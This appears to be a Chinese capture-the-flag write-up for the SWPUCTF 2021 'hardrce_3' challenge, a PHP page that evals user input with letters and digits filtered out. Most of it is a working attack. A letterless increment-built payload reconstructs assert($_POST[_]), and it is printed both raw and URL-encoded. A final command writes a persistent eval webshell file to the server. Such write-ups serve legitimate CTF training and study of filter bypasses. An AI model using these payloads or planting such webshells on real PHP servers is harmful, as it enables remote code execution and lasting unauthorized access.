# [SWPUCTF 2021 新生赛]hardrce_3 无字母rce 自增

这里是过滤了取反等符号 所以考虑自增

```php
 <?php
header("Content-Type:text/html;charset=utf-8");
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['wllm']))
{
    $wllm = $_GET['wllm'];
    $blacklist = [' ','\^','\~','\|'];
    foreach ($blacklist as $blackitem)
    {
        if (preg_match('/' . $blackitem . '/m', $wllm)) {
        die("小伙子只会异或和取反？不好意思哦LTLT说不能用！！");
    }}
if(preg_match('/[a-zA-Z0-9]/is',$wllm))
{
    die("Ra'sAlGhul说用字母数字是没有灵魂的！");
}
echo "NoVic4说：不错哦小伙子，可你能拿到flag吗？";
eval($wllm);
}
else
{
    echo "蔡总说：注意审题！！！";
}
?> 小伙子只会异或和取反？不好意思哦LTLT说不能用！！
```

这里直接可以在之前ctfshow 的yu师傅那边拿payload

因为都是，🐎

assert($_POST[_]);

```cobol
$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
```

然后通过url编码

```cobol
%24_%3d%5b%5d%3b%24_%3d%40%22%24_%22%3b%24_%3d%24_%5b'!'%3d%3d'%40'%5d%3b%24___%3d%24_%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24____%3d'_'%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24_%3d%24%24____%3b%24___(%24_%5b_%5d)%3b
```

然后通过post getshell即可

发现过滤了 要么绕过 试试看蚁剑的 但是好像没有过滤 file_put_contents 看看能不能直接获取

```cobol
_=file_put_contents('2.php','<?php eval($_POST[1]);?>');
```
